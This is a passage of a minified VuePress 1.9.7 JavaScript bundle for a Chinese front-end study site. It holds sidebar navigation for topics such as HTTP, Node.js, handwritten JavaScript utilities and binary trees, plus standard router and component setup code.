TP/TCP和UDP","/webstudy/HTTP/浏览器的缓存机制","/webstudy/HTTP/网页多标签通讯","/webstudy/HTTP/webSocket"]},{title:"Nodejs",children:["/webstudy/Nodejs/nodejs多进程","/webstudy/Nodejs/中间件","/webstudy/Nodejs/洋葱模型"]},{title:"项目",children:["/webstudy/项目/权限设计"]},{title:"设计模式",children:["/webstudy/设计模式/设计模式"]}],"/javascript/":["/javascript/深拷贝","/javascript/手写instanceof","/javascript/手写call,bind,apply","/javascript/手写new操作符","/javascript/节流和防抖","/javascript/手写promise","/javascript/单例模式","/javascript/Array去重扁平化","/javascript/柯里化函数","/javascript/手写Ajax","/javascript/add(1)(2)(3)","/javascript/for in和for of","/javascript/for和forEach谁更快","/javascript/手写getType"],"/dataStructure/":["/dataStructure/",{title:"树简介",children:["/dataStructure/树简介/简介"]},{title:"二叉树",children:["/dataStructure/二叉树/前序遍历","/dataStructure/二叉树/中序遍历","/dataStructure/二叉树/后序遍历","/dataStructure/二叉树/二叉树的宽度","/dataStructure/二叉树/重建二叉树","/dataStructure/二叉树/最小最大深度","/dataStructure/二叉树/层序遍历"]}]},codeSwitcher:{groups:{default:{ts:"TypeScript",js:"JavaScript"},"plugin-usage":{tuple:"Tuple",object:"Object"}}}}};t(347);o.a.component("Badge",(function(){return Promise.all([t.e(0),t.e(4)]).then(t.bind(null,543))})),o.a.component("CodeBlock",(function(){return Promise.all([t.e(0),t.e(5)]).then(t.bind(null,457))})),o.a.component("CodeGroup",(function(){return Promise.all([t.e(0),t.e(6)]).then(t.bind(null,458))})),o.a.component("Step",(function(){return Promise.all([t.e(0),t.e(9)]).then(t.bind(null,459))})),o.a.component("Details",(function(){return Promise.all([t.e(0),t.e(7)]).then(t.bind(null,544))})),o.a.component("NextSteps",(function(){return Promise.all([t.e(0),t.e(8)]).then(t.bind(null,545))})),o.a.component("Summary",(function(){return Promise.all([t.e(0),t.e(10)]).then(t.bind(null,546))})),o.a.component("VPIconExternalLink",(function(){return Promise.all([t.e(0),t.e(11)]).then(t.bind(null,547))})),o.a.component("VPLink",(function(){return t.e(3).then(t.bind(null,460))}));o.a.component("CodeSwitcher",(function(){return Promise.all([t.e(0),t.e(12)]).then(t.bind(null,455))}));t(348);var Ve=[{},function(n){n.Vue.mixin({computed:{$dataBlock:function(){return this.$options.__data__block__}}})},{},{},{}],Re=[];function qe(n,e){if(!(n instanceof e))throw new TypeError("Cannot call a class as a function")}t(121);function He(n,e){for(var t=0;t<e.length;t++){var r=e[t];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(n,r.key,r)}}function Ne(n,e,t){return e&&He(n.prototype,e),t&&He(n,t),Object.defineProperty(n,"prototype",{writable:!1}),n}t(194),t(63),t(66);t(186);function Ue(n,e){return(Ue=Object.setPrototypeOf||function(n,e){return n.__proto__=e,n})(n,e)}t(187),t(188);function Je(n){return(Je=Object.setPrototypeOf?Object.getPrototypeOf:function(n){return n.__proto__||Object.getPrototypeOf(n)})(n)}function We(n,e){if(e&&("object"===Object(Yn.a)(e)||"function"==typeof e))return e;if(void 0!==e)throw new TypeError("Derived constructors may only return object or undefined");return function(n){if(void 0===n)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return n}(n)}function Xe(n){var e=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(n){return!1}}();return function(){var t,r=Je(n);if(e){var o=Je(this).constructor;t=Reflect.construct(r,arguments,o)}else t=r.apply(this,arguments);return We(this,t)}}var Ge=function(n){!function(n,e){if("function"!=typeof e&&null!==e)throw new TypeError("Super expression must either be null or a function");n.prototype=Object.create(e&&e.prototype,{constructor:{value:n,writable:!0,configurable:!0}}),Object.defineProperty(n,"prototype",{writable:!1}),e&&Ue(n,e)}(t,n);var e=Xe(t);function t(){return qe(this,t),e.apply(this,arguments)}return Ne(t)}(function(){function n(){qe(this,n),this.store=new o.a({data:{state:{}}})}return Ne(n,[{key:"$get",value:function(n){return this.store.state[n]}},{key:"$set",value:function(n,e){o.a.set(this.store.state,n,e)}},{key:"$emit",value:function(){var n;(n=this.store).$emit.apply(n,arguments)}},{key:"$on",value:function(){var n;(n=this.store).$on.apply(n,arguments)}}]),n}());Object.assign(Ge.prototype,{getPageAsyncComponent:fe,getLayoutAsyncComponent:he,getAsyncComponent:me,getVueComponent:ve});var Ke={install:function(n){var e=new Ge;n.$vuepress=e,n.prototype.$vuepress=e}};t(120);function Ye(n){n.beforeEach((function(e,t,r){if(Qe(n,e.path))r();else if(/(\/|\.html)$/.test(e.path))if(/\/$/.test(e.path)){var o=e.path.replace(/\/$/,"")+".html";Qe(n,o)?r(o):r()}else r();else{var a=e.path+"/",i=e.path+".html";Qe(n,i)?r(i):Qe(n,a)?r(a):r()}}))}function Qe(n,e){var t=e.toLowerCase();return n.options.routes.some((function(n){return n.path.toLowerCase()===t}))}var Ze={props:{pageKey:String,slotKey:{type:String,default:"default"}},render:function(n){var e=this.pageKey||this.$parent.$page.key;return ge("pageKey",e),o.a.component(e)||o.a.component(e,fe(e)),o.a.component(e)?n(e):n("")}},nt={functional:!0,props:{slotKey:String,required:!0},render:function(n,e){var t=e.props,r=e.slots;return n("div",{class:["content__".concat(t.slotKey)]},r()[t.slotKey])}},et={computed:{openInNewWindowTitle:function(){return this.$themeLocaleConfig.openNewWindowText||"(opens new window)"}}},tt=(t(350),t(351),Object(Fe.a)(et,(function(){var n=this.$createElement,e=this._self._c||n;return e("span",[e("svg",{staticClass:"icon outbound",attrs:{xmlns:"http://www.w3.org/2000/svg","aria-hidden":"true",focusable:"false",x:"0px",y:"0px",viewBox:"0 0 100 100",width:"15",height:"15"}},[e("path",{attrs:{fill:"currentColor",d:"M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"}}),this._v(" "),e("polygon",{attrs:{fill:"currentColor",points:"45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"}})]),this._v(" "),e("span",{staticClass:"sr-only"},[this._v(this._s(this.openInNewWindowTitle))])])}),[],!1,null,null,null).exports);function rt(){return(rt=Object(r.a)(regeneratorRuntime.mark((function n(e){var t,r,a,i;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:return t="undefined"!=typeof window&&window.__VUEPRESS_ROUTER_BASE__?window.__VUEPRESS_ROUTER_BASE__:Me.routerBase||Me.base,Ye(r=new Gn({base:t,mode:"history",fallback:!1,routes:Le,scrollBehavior:function(n,e,t){return t||(n.hash?!o.a.$vuepress.$get("disableScrollBehavior")&&{selector:decodeURIComponent(n.hash)}:{x:0,y:0})}})),a={},n.prev=4,n.next=7,Promise.all(Ve.filter((function(n){return"function"==typeof n})).map((function(n){return n({Vue:o.a,options:a,router:r,siteData:Me,isServer:e})})));case 7:n.next=12;break;case 9:n.prev=9,n.t0=n.catch(4),console.error(n.t0);case 12:return i=new o.a(Object.assign(a,{router:r,render:function(n){return n("div",{attrs:{id:"app"}},[n("RouterView",{ref:"layout"}),n("div",{class:"global-ui"},Re.map((function(e){return n(e)})))])}})),n.abrupt("return",{app:i,router:r});case 14:case"end":return n.stop()}}),n,null,[[4,9]])})))).apply(this,arguments)}o.a.config.productionTip=!1,o.a.use(Gn),o.a.use(Ke),o.a.mixin(function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:o.a;Kn(e),t.$vuepress.$set("siteData",e);var r=n(t.$vuepress.$get("siteData")),a=new r,i=Object.getOwnPropertyDescriptors(Object.getPrototypeOf(a)),s={};return Object.keys(i).reduce((function(n,e){return e.startsWith("$")&&(n[e]=i[e].get),n}),s),{computed:s}}((function(n){return function(){function e(){qe(this,e)}return Ne(e,[{key:"setPage",value:function(n){this.__page=n}},{key:"$site",get:function(){return n}},{key:"$themeConfig",get:function(){return this.$site.themeConfig}},{key:"$frontmatter",get:function(){return this.$page.frontmatter}},{key:"$localeConfig",get:function(){var n,e,t=this.$site.locales,r=void 0===t?{}:t;for(var o in r)"/"===o?e=r[o]:0===this.$page.path.indexOf(o)&&(n=r[o]);return n||e||{}}},{key:"$siteTitle",get:function(){return this.$localeConfig.title||this.$site.title||""}},{key:"$canonicalUrl",get:function(){var n=this.$page.frontmatter.canonicalUrl;return"string"==typeof n&&n}},{key:"$title",get:function(){var n=this.$page,e=this.$page.frontmatter.metaTitle;if("string"==typeof e)return e;var t=this.$siteTitle,r=n.frontmatter.home?null:n.frontmatter.title||n.title;return t?r?r+" | "+t:t:r||"VuePress"}},{key:"$description",get:function(){var n=function(n){if(n){var e=n.filter((function(n){return"description"===n.name}))[0];if(e)return e.content}}(this.$page.frontmatter.meta);return n||(this.$page.frontmatter.description||this.$localeConfig.description||this.$site.description||"")}},{key:"$lang",get:function(){return this.$page.frontmatter.lang||this.$localeConfig.lang||"en-US"}},{key:"$localePath",get:function(){return this.$localeConfig.path||"/"}},{key:"$themeLocaleConfig",get:function(){return(this.$site.themeConfig.locales||{})[this.$localePath]||{}}},{key:"$page",get:function(){return this.__page?this.__page:function(n,e){for(var t=0;t<n.length;t++){var r=n[t];if(r.path.toLowerCase()===e.toLowerCase())return r}return{path:"",frontmatter:{}}}(this.$site.pages,this.$route.path)}}]),e}()}),Me)),o.a.component("Content",Ze),o.a.component("ContentSlotsDistributor",nt),o.a.component("OutboundLink",tt),o.a.component("ClientOnly",{functional:!0,render:function(n,e){var t=e.parent,r=e.children;if(t._isMounted)return r;t.$once("hook:mounted",(function(){t.$forceUpdate()}))}}),o.a.component("Layout",he("Layout")),o.a.component("NotFound",he("NotFound")),o.a.prototype.$withBase=function(n){var e=this.$site.base;return"/"===n.charAt(0)?e+n.slice(1):n},window.__VUEPRESS__={version:"1.9.7",hash:"7cc8761b"},function(n){return rt.apply(this,arguments)}(!1).then((function(n){var e=n.app;n.router.onReady((function(){e.$mount("#app")}))}))}]);